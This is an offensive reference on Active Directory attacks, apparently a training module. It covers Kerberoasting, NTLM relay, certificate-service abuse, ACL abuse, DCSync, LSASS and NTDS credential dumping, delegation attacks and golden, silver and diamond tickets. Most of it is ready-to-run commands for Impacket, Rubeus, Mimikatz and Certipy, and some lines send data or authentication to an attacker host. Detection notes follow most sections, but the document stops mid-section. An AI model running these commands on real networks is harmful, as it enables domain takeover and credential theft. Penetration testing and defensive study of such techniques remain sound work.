<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
<!-- CIPHER is a trademark of defconxt. -->

# Active Directory Attack Techniques — Deep Reference

> CIPHER Training Module | Compiled 2026-03-14
> Sources: The Hacker Recipes, HackTricks, SpecterOps Certified Pre-Owned, harmj0y research, ADSecurity.org, BloodHound documentation

---

## Table of Contents

1. [Kerberos Attacks](#1-kerberos-attacks)
2. [NTLM Attacks](#2-ntlm-attacks)
3. [AD Certificate Services (ADCS)](#3-ad-certificate-services-adcs)
4. [DACL / ACL Abuse](#4-dacl--acl-abuse)
5. [Credential Access](#5-credential-access)
6. [Delegation Attacks](#6-delegation-attacks)
7. [Forged Tickets](#7-forged-tickets)
8. [AD Persistence](#8-ad-persistence)
9. [Forest Trust Attacks](#9-forest-trust-attacks)
10. [Man-in-the-Middle in AD](#10-man-in-the-middle-in-ad)
11. [BloodHound Queries & Attack Paths](#11-bloodhound-queries--attack-paths)
12. [Detection Signatures](#12-detection-signatures)

---

## 1. Kerberos Attacks

### 1.1 AS-REP Roasting (T1558.004)

**Theory**: Accounts with "Do not require Kerberos preauthentication" enabled allow anyone to request a TGT. The KRB_AS_REP contains a session key encrypted with the user's NT hash, crackable offline.

**Prerequisites**: List of usernames (or anonymous LDAP bind); no domain credentials required for the request itself (but needed to enumerate vulnerable accounts).

**Commands**:

```bash
# Impacket — enumerate and request (anonymous LDAP)
GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $DC 'DOMAIN/'

# Impacket — with credentials
GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $DC 'DOMAIN/USER:Password'

# Impacket — with NT hash
GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes 'LM:NT' -dc-ip $DC 'DOMAIN/USER'

# Impacket — with a users file (no creds needed)
GetNPUsers.py -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip $DC 'DOMAIN/'

# NetExec
netexec ldap $TARGETS -u $USER -p $PASSWORD --asreproast ASREProastables.txt --kdcHost $DC

# Rubeus (Windows)
Rubeus.exe asreproast /format:hashcat /outfile:ASREProastables.txt
```

**Cracking**:
```bash
hashcat -m 18200 -a 0 ASREProastables.txt wordlist.txt
john --wordlist=wordlist.txt ASREProastables.txt
```

**ASREProast via MitM** (no preauth disabled needed):
```bash
# ARP spoof + force RC4 downgrade
ASRepCatcher relay -dc $DC_IP
ASRepCatcher relay -dc $DC_IP --disable-spoofing
ASRepCatcher listen  # passive mode
```

**Detection**:
- Event ID 4768 (TGT requested) with Encryption Type 0x17 (RC4) and Result Code 0x0 for accounts without preauth
- Sigma: `logsource: {category: authentication, product: windows}`, filter on PreAuthType = 0
- Anomalous volume of AS-REQ for accounts with `DONT_REQUIRE_PREAUTH` UAC flag

---

### 1.2 Kerberoasting (T1558.003)

**Theory**: Any authenticated user can request a Service Ticket (TGS) for any SPN. The TGS is encrypted with the service account's key (derived from password). User accounts with SPNs likely have human-chosen passwords vulnerable to offline cracking.

**Prerequisites**: Valid domain credentials. Target: user accounts (not computer accounts) with SPNs set.

**Commands**:

```bash
# Impacket — request all roastable hashes
GetUserSPNs.py -request -dc-ip $DC -outputfile kerberoastables.txt 'DOMAIN/USER:Password'

# Impacket — with NT hash
GetUserSPNs.py -request -dc-ip $DC -outputfile kerberoastables.txt -hashes 'LM:NT' 'DOMAIN/USER'

# Impacket — target specific user
GetUserSPNs.py -request-user svc_sql -dc-ip $DC 'DOMAIN/USER:Password'

# NetExec
netexec ldap $DC -u $USER -p $PASSWORD --kerberoasting kerberoastables.txt --kdcHost $DC

# pypykatz — force RC4 (faster to crack)
pypykatz kerberos spnroast -d $DOMAIN -t $TARGET_USER -e 23 'kerberos+password://DOMAIN\user:Pass@DC_IP'

# Rubeus (Windows)
Rubeus.exe kerberoast /outfile:kerberoastables.txt
Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.txt
Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
Rubeus.exe kerberoast /stats  # enumerate without requesting

# OPSEC: AES-only environments
Rubeus.exe kerberoast /aes /outfile:hashes.aes
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
Rubeus.exe kerberoast /tgtdeleg /outfile:hashes.txt  # force RC4 via tgtdeleg
```

**Kerberoast without Pre-Authentication** (no creds at all):
```bash
# Requires knowledge of an ASREProastable account + target SPNs
GetUserSPNs.py -no-preauth "bobby" -usersfile "services.txt" -dc-host $DC "DOMAIN.LOCAL"/

# Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt /domain:"DOMAIN.LOCAL" /dc:"DC01" /nopreauth:"nopreauth_user" /spn:"target_service"
```

**Targeted Kerberoasting** (set SPN on target via GenericAll/GenericWrite):
```powershell
# Set SPN
Set-DomainObject -Identity 'targetuser' -Set @{serviceprincipalname="fake/NOTHING"}
# Roast
Rubeus.exe kerberoast /user:targetuser /nowrap
# Clean up
Set-DomainObject -Identity 'targetuser' -Clear serviceprincipalname
```

**Cracking**:
```bash
# RC4 (etype 23) — ~4.18 billion guesses/s on RTX 5090
hashcat -m 13100 kerberoastables.txt wordlist.txt
# AES256 (etype 18) — ~6.8 million guesses/s
hashcat -m 19700 kerberoastables.txt wordlist.txt
john --format=krb5tgs --wordlist=wordlist.txt kerberoastables.txt
```

**Detection**:
- Event ID 4769 (TGS requested) — anomalous volume, RC4 encryption (0x17), targeting user-account SPNs
- Sigma rule: filter 4769 where TicketEncryptionType = 0x17 AND ServiceName does not end with $
- Correlate: sudden burst of TGS requests from a single source for multiple SPNs

---

## 2. NTLM Attacks

### 2.1 NTLM Relay

**Theory**: Captured NTLM authentication can be relayed to other services that accept NTLM. Critical targets include LDAP (for RBCD/ACL abuse), SMB (code exec), HTTP (ADCS web enrollment), MSSQL.

**Coercion Techniques** (force authentication):

| Technique | Protocol | Tool | Command |
|-----------|----------|------|---------|
| PetitPotam | MS-EFSR | petitpotam.py | `petitpotam.py LISTENER_IP DC_IP` |
| PrinterBug | MS-RPRN | printerbug.py | `printerbug.py DOMAIN/USER:PASS@DC_IP LISTENER_IP` |
| DFSCoerce | MS-DFSNM | dfscoerce.py | `dfscoerce.py -u USER -p PASS -d DOMAIN LISTENER_IP DC_IP` |
| ShadowCoerce | MS-FSRVP | shadowcoerce.py | `shadowcoerce.py -u USER -p PASS -d DOMAIN LISTENER_IP DC_IP` |

**Relay to LDAP** (RBCD / ACL abuse):
```bash
# Set up relay to LDAP for RBCD
ntlmrelayx.py -t ldap://DC_IP --delegate-access -smb2support

# Relay to LDAP for ACL abuse (grant DCSync)
ntlmrelayx.py -t ldap://DC_IP --escalate-user controlled_user -smb2support

# Relay to ADCS HTTP enrollment (ESC8)
ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

**Relay to SMB**:
```bash
ntlmrelayx.py -t smb://TARGET_IP -smb2support -c "whoami"
ntlmrelayx.py -tf targets.txt -smb2support -e payload.exe
```

### 2.2 Pass-the-Hash

```bash
# Impacket psexec
psexec.py -hashes 'LM:NT' DOMAIN/USER@TARGET

# Impacket wmiexec
wmiexec.py -hashes 'LM:NT' DOMAIN/USER@TARGET

# Impacket smbexec
smbexec.py -hashes 'LM:NT' DOMAIN/USER@TARGET

# NetExec
netexec smb TARGET -u USER -H NT_HASH -d DOMAIN

# Mimikatz (over-pass-the-hash / pass-the-key)
sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:HASH /run:cmd.exe
```

### 2.3 Capture with Responder

```bash
# LLMNR/NBT-NS/mDNS poisoning
responder -I eth0 -dwP

# Analyze mode (passive)
responder -I eth0 -A
```

**Detection**:
- Event ID 4624 (Logon) with Logon Type 3 and NTLM auth from unexpected sources
- Event ID 8004/8005 (NTLM authentication) in Microsoft-Windows-NTLM/Operational
- Network: detect LLMNR (UDP 5355), NBT-NS (UDP 137) responses from non-DNS servers
- Sigma: NTLM relay detection via mismatch between source IP in 4624 and actual computer account

---

## 3. AD Certificate Services (ADCS)

### 3.1 Enumeration

```bash
# Certipy — enumerate all vulnerable templates
certipy find -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -vulnerable
certipy find -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -stdout

# Certify (Windows)
Certify.exe find /vulnerable
Certify.exe find /vulnerable /currentuser
Certify.exe cas  # enumerate CAs and flags
```

### 3.2 ESC1 — Enrollee Supplies Subject (SAN)

**Conditions**: Template allows SAN specification (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT), has auth EKU (Client Auth, Smart Card Logon, Any Purpose), manager approval disabled, low-priv enrollment.

```bash
# Certipy
certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" \
  -ca 'ca_name' -template 'VulnTemplate' -upn 'administrator@domain.local'

# For computer account impersonation
certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" \
  -ca 'ca_name' -template 'VulnTemplate' -dns 'dc.domain.local'

# Certify (Windows)
Certify.exe request /ca:DC\CA-NAME /template:VulnTemplate /altname:administrator

# Authenticate with certificate
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'domain.local' -dc-ip $DC_IP
Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /password:pfxpass /ptt
```

### 3.3 ESC2 — Any Purpose / No EKU

Same conditions as ESC1 but template has Any Purpose EKU (OID 2.5.29.37.0) or SubCA (no EKU). Cannot directly specify SAN but can be chained with ESC3.

### 3.4 ESC3 — Certificate Request Agent

**Two-step attack**: First get enrollment agent cert, then use it to request on behalf of target.

```bash
# Step 1: Get enrollment agent certificate
certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" \
  -ca 'ca_name' -template 'EnrollmentAgentTemplate'

# Step 2: Request on behalf of target
certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" \
  -ca 'ca_name' -template 'User' -on-behalf-of 'DOMAIN\administrator' -pfx 'agent.pfx'

# Certify (Windows)
Certify.exe request /ca:DC\CA /template:Vuln-EnrollmentAgent
Certify.exe request /ca:DC\CA /template:User /onbehalfof:DOMAIN\admin /enrollment:agent.pfx /enrollcertpwd:pass
```

### 3.5 ESC4 — Vulnerable Template ACLs

Attacker has write permissions (FullControl, WriteDacl, WriteOwner, WriteProperty) over a certificate template. Modify it to be vulnerable to ESC1.

```bash
# Certipy — make template vulnerable to ESC1, save old config
certipy template -username $USER@$DOMAIN -password $PASSWORD -template ESC4-Template -save-old

# Exploit as ESC1
certipy req -username $USER@$DOMAIN -password $PASSWORD -ca CA-NAME -target $ADCS \
  -template ESC4-Template -upn administrator@$DOMAIN

# Restore original config
certipy template -username $USER@$DOMAIN -password $PASSWORD -template ESC4-Template \
  -configuration ESC4-Template.json
```

### 3.6 ESC5 — Vulnerable PKI Object ACLs

Permissions on PKI objects beyond templates: CA server computer object, NTAuthCertificates, Enrollment Services container. Chain with RBCD on CA server or modify trust objects.

### 3.7 ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2

**Condition**: CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` flag enabled. ANY template with auth EKU becomes ESC1-exploitable.

```bash
# Check flag
certipy find -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -stdout | grep "User Specified SAN"

# Exploit (same as ESC1)
certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -ca 'ca_name' \
  -template 'User' -upn 'administrator@domain.local'
```

> **NOTE**: May 2022 patches (CVE-2022-26923) broke ESC6 in patched environments.

### 3.8 ESC7 — CA Access Control

- **ManageCA** permission: can enable ESC6 flag remotely
- **ManageCertificates** permission: can approve pending requests, bypassing manager approval

### 3.9 ESC8 — NTLM Relay to HTTP Enrollment

**Condition**: CA has HTTP enrollment endpoint (certsrv) without EPA.

```bash
# Relay to ADCS web enrollment
ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Coerce DC authentication
petitpotam.py ATTACKER_IP DC_IP
printerbug.py DOMAIN/USER:PASS@DC_IP ATTACKER_IP
```

### 3.10 ESC9 — No Security Extension (CT_FLAG_NO_SECURITY_EXTENSION)

**Conditions**: StrongCertificateBindingEnforcement != 2, template has CT_FLAG_NO_SECURITY_EXTENSION, GenericWrite on an account.

```bash
# Shadow credentials to get user2 hash
certipy shadow auto -username "user1@$DOMAIN" -p "$PASSWORD" -account user2

# Change user2 UPN to target user3
certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn user3

# Request cert as user2
certipy req -username "user2@$DOMAIN" -hashes "$NT_HASH" -target "$ADCS_HOST" \
  -ca 'ca_name' -template 'VulnTemplate'

# Restore UPN
certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn "user2@$DOMAIN"

# Auth as user3
certipy auth -pfx 'user2.pfx' -domain '$DOMAIN'
```

### 3.11 ESC10 — Weak Certificate Mapping

Similar to ESC9, exploits weak mapping when StrongCertificateBindingEnforcement = 0 or CertificateMappingMethods includes UPN flag (0x4).

### 3.12 ESC11 — NTLM Relay to ICPR (RPC Enrollment)

Relay NTLM to the certificate enrollment RPC interface when it lacks signing requirements.

### 3.13 ESC12 — YubiHSM Key Storage Provider

Shell access to CA server with YubiHSM allows reading cleartext auth key from registry and forging certificates.

### 3.14 ESC13 — Issuance Policy to Group Mapping

Enrollment in a template with an issuance policy linked to a group (via `msDS-OIDToGroupLink`) grants group membership in the access token.

### 3.15 ESC14 — Weak Explicit Mapping

Abuse explicit certificate mapping (`altSecurityIdentities`) when weak mapping types are allowed.

**Detection (all ADCS attacks)**:
- Event ID 4886 (Certificate Services received a certificate request)
- Event ID 4887 (Certificate Services approved a certificate request)
- Event ID 4882 (CA security permissions changed)
- Monitor template modifications via Event ID 4899/4900
- Sigma: Certificate requested with SAN different from requestor identity
- Monitor for NTLM authentication to /certsrv/ endpoints

---

## 4. DACL / ACL Abuse

### 4.1 Abuse Matrix

| Right | Target | Attack | Tool |
|-------|--------|--------|------|
| GenericAll | User | Reset password, set SPN (Kerberoast), disable preauth (ASREProast), Shadow Credentials | bloodyAD, PowerView, dacledit |
| GenericAll | Group | Add self to group | net group, Add-ADGroupMember, bloodyAD |
| GenericAll | Computer | RBCD, Shadow Credentials | rbcd.py, certipy shadow |
| GenericWrite | User | Targeted Kerberoasting (set SPN), logon script, Shadow Credentials | PowerView, dacledit |
| WriteProperty | Group | Add members | PowerView |
| WriteDacl | Any | Grant self GenericAll/FullControl, grant DCSync rights | dacledit, Add-DomainObjectAcl |
| WriteOwner | Any | Change owner to self, then WriteDacl | Set-DomainObjectOwner |
| ForceChangePassword | User | Reset password without knowing current | rpcclient, bloodyAD, net rpc |
| DS-Replication-Get-Changes + DS-Replication-Get-Changes-All | Domain | DCSync | secretsdump, mimikatz |
| AddKeyCredentialLink | User/Computer | Shadow Credentials | certipy shadow, pywhisker |
| WriteSPN | User | Targeted Kerberoasting | Set-DomainObject |
| AddAllowedToAct | Computer | RBCD | rbcd.py |

### 4.2 Key Commands

```bash
# Impacket dacledit — grant full control
dacledit.py -action 'write' -rights 'FullControl' -principal 'attacker' -target 'victim' "$DOMAIN/$USER:$PASSWORD"

# Grant DCSync rights
dacledit.py -action 'write' -rights 'DCSync' -principal 'attacker' -target 'domain_dn' "$DOMAIN/$USER:$PASSWORD"

# bloodyAD — grant full control
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add genericAll "$Target" "$Attacker"

# bloodyAD — grant DCSync
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add dcsync "$Attacker"

# bloodyAD — force password change
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set password "$Target" "$NewPass"

# rpcclient — force password change
rpcclient -U DOMAIN/USER%PASS $DC -c 'setuserinfo2 TargetUser 23 NewP@ss!'

# PowerView — grant full control
Add-DomainObjectAcl -Rights 'All' -TargetIdentity "victim" -PrincipalIdentity "attacker"

# PowerView — write owner
Set-DomainObjectOwner -Identity victim -OwnerIdentity attacker

# PowerView — targeted Kerberoasting
Set-DomainObject -Identity 'target' -Set @{serviceprincipalname="fake/NOTHING"}
```

**ACE Inheritance for containers/OUs**:
```bash
dacledit.py -action 'write' -rights 'FullControl' -principal 'attacker' \
  -target-dn 'CN=Users,DC=domain,DC=local' -inheritance "$DOMAIN/$USER:$PASSWORD"
```

**Detection**:
- Event ID 5136 (Directory service object was modified) — watch for DACL changes
- Event ID 4662 (An operation was performed on an object) — watch for replication rights
- Monitor changes to `msDS-AllowedToActOnBehalfOfOtherIdentity`, `servicePrincipalName`, `msDS-KeyCredentialLink`
- BloodHound: map abusable ACL paths

---

## 5. Credential Access

### 5.1 DCSync (T1003.006)

**Prerequisites**: DS-Replication-Get-Changes AND DS-Replication-Get-Changes-All (Domain Admins, Enterprise Admins, Administrators, DC groups by default).

```bash
# Impacket secretsdump — full DCSync
secretsdump.py -outputfile 'dcsync' -dc-ip "$DC_IP" "$DOMAIN/$USER:$PASSWORD"@"$DC_HOST"

# With pass-the-hash
secretsdump.py -outputfile 'dcsync' -hashes :"$NT_HASH" -dc-ip "$DC_IP" "$DOMAIN/$USER"@"$DC_HOST"

# With Kerberos ticket
KRB5CCNAME=ticket.ccache secretsdump.py -k -no-pass -outputfile 'dcsync' -dc-ip "$DC_IP" @"$DC_HOST"

# Just krbtgt
secretsdump.py -just-dc-user krbtgt -dc-ip "$DC_IP" "$DOMAIN/$USER:$PASSWORD"@"$DC_HOST"

# Via NTLM relay (requires Zerologon)
ntlmrelayx.py -t dcsync://'DC_HOST'
ntlmrelayx.py -t dcsync://'DC_HOST' -auth-smb 'DOMAIN/USER:PASS'

# Mimikatz
lsadump::dcsync /dc:$DC /domain:$DOMAIN /user:krbtgt
lsadump::dcsync /dc:$DC /domain:$DOMAIN /all /csv
```

**Output files**: `.ntds` (LM/NT hashes), `.cleartext` (reversible encryption), `.kerberos` (DES/AES keys), `.sam` (DC SAM), `.secrets` (DC LSA)

### 5.2 LSASS Dumping (T1003.001)

```bash
# Lsassy (remote, Rolls-Royce)
lsassy -u $USER -H $NThash $TARGETS
lsassy -d $DOMAIN -u $USER -p $PASSWORD $TARGETS
lsassy -k $TARGETS  # Kerberos

# NetExec module
netexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash -M lsassy

# Mimikatz (local)
sekurlsa::logonpasswords

# Mimikatz (from minidump)
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords

# pypykatz (offline)
pypykatz lsa minidump lsass.dmp

# ProcDump
tasklist /fi "imagename eq lsass.exe"
procdump -accepteula -ma $PID lsass.dmp

# comsvcs.dll (no external tools)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $PID C:\temp\lsass.dmp full
```

### 5.3 NTDS.dit Extraction (T1003.003)

```bash
# NTDSUtil (on DC)
ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\Temp\NTDS" quit quit

# VSS Shadow Copy
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system.save

# Impacket with VSS
secretsdump.py -use-vss -dc-ip $DC_IP 'DOMAIN/USER:PASS@DC_HOST'

# Parse offline
secretsdump.py -ntds ntds.dit -system system.save LOCAL
gosecretsdump -ntds ntds.dit -system system.save
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

### 5.4 SAM & LSA Secrets (T1003.002, T1003.004, T1003.005)

```bash
# Remote dump
secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET'
secretsdump.py -hashes 'LM:NT' 'DOMAIN/USER@TARGET'

# NetExec
netexec smb $TARGETS -d $DOMAIN -u $USER -p $PASSWORD --sam
netexec smb $TARGETS -d $DOMAIN -u $USER -p $PASSWORD --lsa

# Registry export (local/remote)
reg save HKLM\SAM C:\temp\sam.save
reg save HKLM\SECURITY C:\temp\security.save
reg save HKLM\SYSTEM C:\temp\system.save

# Impacket remote registry export
reg.py "DOMAIN/USER:PASS@TARGET" backup -o '\\ATTACKER_IP\share'

# Offline parse
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

# Mimikatz
lsadump::sam
lsadump::secrets
```

**Detection**:
- DCSync: Event ID 4662 with GUID `1131f6aa-...` and `1131f6ad-...` (replication rights)
- LSASS: Event ID 4656/4663 with process access to lsass.exe, Sysmon Event ID 10 (process access)
- NTDS: Event ID 8222 (shadow copy creation), ntdsutil execution in command line
- SAM: Event ID 4656 targeting SAM/SECURITY/SYSTEM hives
- Sigma: `win_susp_sam_dump`, `win_lsass_access`, `win_dcsync`

---

## 6. Delegation Attacks

### 6.1 Unconstrained Delegation (KUD)

**Theory**: Compromised account with unconstrained delegation receives TGTs in service tickets from authenticating users. Combined with coercion, captures DC TGTs for domain compromise.

**Enumeration**:
```bash
# BloodHound: MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
# PowerView
Get-DomainComputer -Unconstrained | select dnshostname
# LDAP filter
(&(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(primaryGroupID=516)))
```

**Attack from UNIX-like**:
```bash
# 1. Add attacker SPN to compromised account
addspn.py -u 'DOMAIN\CompAccount' -p 'LM:NT' -s 'HOST/attacker.DOMAIN' --additional 'DC'

# 2. Add DNS record
dnstool.py -u 'DOMAIN\CompAccount' -p 'LM:NT' -r 'attacker.DOMAIN' -d 'ATTACKER_IP' --action add 'DC'

# 3. Start listener
krbrelayx.py -aesKey AES256_KEY
# OR
krbrelayx.py --krbsalt 'DOMAINusername' --krbpass 'password'

# 4. Coerce authentication
printerbug.py DOMAIN/'comp$'@DC_IP -hashes LM:NT 'attacker.DOMAIN'
petitpotam.py ATTACKER_IP DC_IP

# 5. Use captured TGT
export KRB5CCNAME=$(pwd)/krbtgt.ccache
secretsdump.py -k -no-pass -dc-ip $DC_IP @$DC_HOST
```

**Attack from Windows**:
```powershell
# Monitor for incoming tickets
Rubeus.exe monitor /interval:5

# Coerce + capture TGT, then request service ticket
Rubeus.exe asktgs /ticket:$base64_TGT /service:cifs/$TARGET /ptt

# DCSync with captured TGT
lsadump::dcsync /dc:$DC /domain:$DOMAIN /user:krbtgt
```

### 6.2 Constrained Delegation (KCD)

**With Protocol Transition** (TrustedToAuthForDelegation):
```bash
# Impacket
getST.py -spn "cifs/target" -impersonate "Administrator" "$DOMAIN/$USER:$PASSWORD"

# Rubeus
Rubeus.exe s4u /nowrap /msdsspn:"cifs/target" /impersonateuser:"administrator" \
  /domain:"domain" /user:"user" /password:"password"
```

**Without Protocol Transition** (Kerberos only — requires RBCD chaining):
```bash
# Step 1: Configure RBCD on the KCD service (serviceA) from controlled account (serviceB)
rbcd.py -delegate-from 'serviceB' -delegate-to 'serviceA$' -dc-ip $DC -action 'write' 'DOMAIN/attacker:pass'

# Step 2: S4U2self+proxy via RBCD to get forwardable ticket to serviceA
getST.py -spn "cifs/serviceA" -impersonate "administrator" "DOMAIN/serviceB:password"

# Step 3: Additional S4U2proxy from serviceA to actual target
getST.py -spn "cifs/target" -impersonate "administrator" -additional-ticket "admin.ccache" "DOMAIN/serviceA:password"
```

### 6.3 Resource-Based Constrained Delegation (RBCD)

**Prerequisites**: Write access to target's `msDS-AllowedToActOnBehalfOfOtherIdentity` + controlled account with SPN (or create computer via MachineAccountQuota).

**Full Attack Chain (Linux)**:
```bash
# 1. Create machine account
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip $DC 'DOMAIN/user:pass'

# 2. Set RBCD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip $DC -action write 'DOMAIN/user:pass'

# 3. Get impersonation ticket
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip $DC 'DOMAIN/FAKE01$:P@ss123'

# 4. Use ticket
export KRB5CCNAME=$(pwd)/Administrator.ccache
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
impacket-psexec -k -no-pass Administrator@victim.domain.local
```

**Full Attack Chain (Windows)**:
```powershell
# 1. Create machine account
import-module powermad
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force)

# 2. Set RBCD
$sid = Get-DomainComputer FAKE01 -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer VICTIM$ | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# 3. Get hashes
Rubeus.exe hash /password:123456 /user:FAKE01$ /domain:domain.local

# 4. S4U attack
Rubeus.exe s4u /user:FAKE01$ /aes256:$AES /impersonateuser:administrator \
  /msdsspn:cifs/victim.domain.local /altservice:host,ldap,http /domain:domain.local /ptt
```

**SPN-less RBCD** (MachineAccountQuota = 0):
```bash
# Use sacrificial user account instead of computer
getTGT.py -hashes :$(pypykatz crypto nt 'SomePassword') 'DOMAIN/sacrificial_user'
describeTicket.py 'TGT.ccache' | grep 'Ticket Session Key'
changepasswd.py -newhashes :TGTSessionKey 'DOMAIN/sacrificial_user:SomePassword@DC'
KRB5CCNAME='TGT.ccache' getST.py -u2u -impersonate "Administrator" \
  -spn "host/target.domain.com" -k -no-pass 'DOMAIN/sacrificial_user'
```

### 6.4 S4U2Self Abuse (Local Privilege Escalation)

```powershell
# Get machine TGT via tgtdeleg (no elevation needed from virtual account context)
Rubeus.exe tgtdeleg /nowrap

# S4U2self to impersonate domain admin to self
Rubeus.exe s4u /self /nowrap /impersonateuser:"DomainAdmin" \
  /altservice:"cifs/machine.domain.local" /ticket:"base64_TGT"

# Impacket equivalent
getST.py -self -impersonate "DomainAdmin" -altservice "cifs/machine.domain.local" \
  -k -no-pass -dc-ip $DC "domain.local/machine$"
```

**Detection (all delegation)**:
- Event ID 4769 with Transited Services field populated
- S4U2proxy: look for TGS requests where the client differs from the service requestor
- RBCD: Event ID 5136 modifying `msDS-AllowedToActOnBehalfOfOtherIdentity`
- Unconstrained: monitor for TGT in service tickets (unusual delegation flag)
- Sigma: `win_rbcd_delegation_abuse`, `win_unconstrained_delegation_abuse`

---

## 7. Forged Tickets

### 7.1 Golden Ticket (T1558.001)

**Prerequisites**: krbtgt NT hash or AES key + Domain SID.

```bash
# Impacket
ticketer.py -nthash "$krbtgt_NT" -domain-sid "$SID" -domain "$DOMAIN" "targetuser"
ticketer.py -aesKey "$krbtgt_AES256" -domain-sid "$SID" -domain "$DOMAIN" "targetuser"

# Use
export KRB5CCNAME=targetuser.ccache
psexec.py $DOMAIN/targetuser@$DC -k -no-pass

# Mimikatz
kerberos::golden /domain:$DOMAIN /sid:$SID /rc4:$krbtgt_NT /user:Administrator /ptt
kerberos::golden /domain:$DOMAIN /sid:$SID /aes256:$krbtgt_AES /user:Administrator /ptt

# Rubeus
Rubeus.exe golden /rc4:$krbtgt_NT /domain:$DOMAIN /sid:$SID /user:Administrator /ptt /ldap /nowrap
```

**OPSEC**: Use AES256. Set realistic lifetime via `/startoffset`, `/endin`, `/renewmax`. Username must exist in AD (post-Nov 2021 patches).

### 7.2 Silver Ticket

**Prerequisites**: Service account NT hash or AES key + Domain SID + target SPN.

```bash
# Impacket
ticketer.py -nthash "$SVC_NT" -domain-sid "$SID" -domain "$DOMAIN" -spn "cifs/target.domain.local" "username"
ticketer.py -aesKey "$SVC_AES" -domain-sid "$SID" -domain "$DOMAIN" -spn "cifs/target.domain.local" "username"

# Mimikatz
kerberos::golden /domain:$DOMAIN /sid:$SID /rc4:$SVC_NT /user:username \
  /target:target.domain.local /service:cifs /ptt
```

**SPN → Service mapping**: `cifs` (SMB/file), `host` (PsExec/WinRM/scheduled tasks), `http` (WinRM), `ldap` (LDAP/DCSync), `rpcss` (WMI/DCOM), `mssql` (SQL)

### 7.3 Diamond Ticket

**Theory**: Request legitimate TGT, decrypt with krbtgt key, modify PAC, re-encrypt. Evades "TGS without prior AS-REQ" detection.

```bash
# Impacket
ticketer.py -request -domain "$DOMAIN" -user "$USER" -password "$PASSWORD" \
  -nthash '$krbtgt_NT' -aesKey '$krbtgt_AES' -domain-sid '$SID' \
  -user-id '1337' -groups '512,513,518,519,520' 'targetuser'

# Rubeus (high-fidelity with LDAP + OPSEC)
Rubeus.exe diamond /tgtdeleg /ticketuser:svc_sql /ticketuserid:1109 \
  /groups:512,519 /krbkey:$KRBTGT_AES256 \
  /ldap /ldapuser:DOMAIN\user /ldappassword:pass /opsec /nowrap
```

### 7.4 Sapphire Ticket

**Theory**: Combines Diamond ticket base with S4U2self+U2U to steal a real privileged user's PAC. Most stealthy forged ticket variant.

```bash
# Impacket
ticketer.py -request -impersonate 'domainadmin' \
  -domain 'DOMAIN.FQDN' -user 'lowpriv' -password 'password' \
  -nthash '$krbtgt_NT' -aesKey '$krbtgt_AES' \
  -user-id '1115' -domain-sid '$SID' 'baduser'
```

> **Caveat**: Post KB5008380 enforcement (Oct 2022), PAC_REQUESTOR and PAC_ATTRIBUTES_INFO structures required in TGTs. Sapphire technique may hit `KDC_ERR_TGT_REVOKED` in fully patched environments.

**Detection (all forged tickets)**:
